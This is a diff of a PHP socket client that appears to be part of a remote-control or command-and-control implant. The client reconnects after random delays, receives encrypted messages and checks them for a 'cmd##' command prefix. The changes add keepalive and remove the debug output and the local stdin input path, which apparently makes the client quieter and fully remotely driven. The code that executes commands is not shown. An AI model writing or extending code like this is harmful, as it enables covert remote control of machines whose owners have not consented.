@@ -106,6 +106,7 @@ class ClientSocket {
                 sleep(rand(1,5));
 
                 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+                socket_set_option($socket, SOL_SOCKET, SO_KEEPALIVE, 1);
                 //socket_set_option($socket, SOL_SOCKET, SO_REUSEADDR, 1);
                 //socket_set_option($socket, SOL_SOCKET, SO_REUSEPORT, 1);
                 $result = socket_connect($socket, $addr, $port);
@@ -117,9 +118,6 @@ class ClientSocket {
                     $temp_recv = $recv;
                     if(($recv = decrypt_cbcClient($recv, $AES_key)) === null){
                         $recv = $temp_recv;
-                    }
-                    else {
-                        echo "successfuly decrypted msg!\n";
                     }
                 }
                 if(preg_match('/^(cmd##){1}/', $recv)){
@@ -172,39 +170,10 @@ class ClientSocket {
                     echo "server: {$recv}\n";
                 }
             }
-            $w = $r = $e = [];
-            $wbuff = handle_stdin($r, $w, $e);
-            if(false === socket_write($socket, $wbuff, strlen($wbuff))){
-                echo "\r\nsocket-write error\r\n";
-            }
         }
         socket_close($socket);
         unset($openssl);
     }
-}
-/**
- * 
- * @return string => line
- */
-function handle_stdin(array $r, array $w, array $e) : string
-{
-    $stdin = fopen('php://stdin', 'r');
-    stream_set_blocking($stdin, 0);
-    $r = [ $stdin ];
-    if(($result = stream_select($r, $w, $e, 0.2, 500000)) !== false){
-        if($result === 0) { 
-            fclose($stdin);
-            return "";
-        }
-        $line = stream_get_line($stdin, STREAM_BUFFER_LEN, "\n");
-    }
-    else {
-        echo "[\33[91m!\33[0m] error: stream_select() error.\n";
-        fclose($stdin);
-        $line = "";
-    }
-    fclose($stdin);
-    return $line;
 }
 function decryptRSAClient(string $publicKey, string $encryptedb64) :? string {
     if(false === ($encrypted = base64_decode($encryptedb64))){
